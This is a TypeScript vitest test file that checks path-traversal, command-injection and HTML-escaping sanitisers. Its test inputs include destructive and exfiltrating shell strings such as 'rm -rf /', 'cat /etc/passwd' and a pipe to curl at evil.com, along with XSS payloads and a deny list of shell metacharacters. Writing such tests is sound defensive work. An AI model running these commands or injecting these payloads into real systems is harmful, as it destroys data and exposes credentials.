import { describe, it, expect } from 'vitest';
import path from 'path';

function sanitizePath(userPath: string, baseDir: string): string | null {
  const resolved = path.resolve(baseDir, userPath);
  if (!resolved.startsWith(baseDir)) return null;
  return resolved;
}

function isCommandSafe(command: string): boolean {
  const dangerous = [';', '&&', '||', '`', '$(',  '>', '<', '|', '\n', '\r'];
  return !dangerous.some(c => command.includes(c));
}

function sanitizeHtml(input: string): string {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

describe('Path traversal prevention', () => {
  const base = '/projects/user123';

  it('allows paths within base dir', () => {
    expect(sanitizePath('src/index.ts', base)).toBe('/projects/user123/src/index.ts');
  });

  it('blocks ../ traversal', () => {
    expect(sanitizePath('../../etc/passwd', base)).toBeNull();
  });

  it('blocks absolute path escape', () => {
    expect(sanitizePath('/etc/passwd', base)).toBeNull();
  });

  it('blocks encoded traversal', () => {
    expect(sanitizePath('src/../../../etc/passwd', base)).toBeNull();
  });
});

describe('Command injection prevention', () => {
  it('allows safe commands', () => {
    expect(isCommandSafe('npm run build')).toBe(true);
    expect(isCommandSafe('ls -la')).toBe(true);
  });

  it('blocks semicolon injection', () => {
    expect(isCommandSafe('npm install; rm -rf /')).toBe(false);
  });

  it('blocks && chaining', () => {
    expect(isCommandSafe('echo hi && cat /etc/passwd')).toBe(false);
  });

  it('blocks subshell execution', () => {
    expect(isCommandSafe('echo $(whoami)')).toBe(false);
  });

  it('blocks pipe', () => {
    expect(isCommandSafe('ls | curl http://evil.com')).toBe(false);
  });
});

describe('XSS prevention', () => {
  it('escapes script tags', () => {
    const result = sanitizeHtml('<script>alert("xss")</script>');
    expect(result).not.toContain('<script>');
    expect(result).toContain('&lt;script&gt;');
  });

  it('escapes attribute injection', () => {
    const result = sanitizeHtml('" onmouseover="alert(1)"');
    expect(result).toContain('&quot;');
  });

  it('escapes angle brackets', () => {
    const result = sanitizeHtml('<img src=x onerror=alert(1)>');
    expect(result).toContain('&lt;img');
  });
});
